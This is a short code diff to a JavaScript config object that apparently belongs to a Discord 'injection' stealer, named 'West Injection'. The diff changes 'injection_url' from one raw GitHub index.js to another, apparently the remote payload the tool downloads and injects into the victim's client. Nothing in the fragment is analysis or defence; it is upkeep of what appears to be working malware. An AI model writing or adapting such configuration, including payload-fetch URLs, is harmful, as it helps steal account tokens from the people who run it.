@@ -14,7 +14,7 @@ const config = {
   embed_name: 'West Injection', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/WestVCoder/FERHAT0XZ/main/index.js', 
   /**
    
    **/
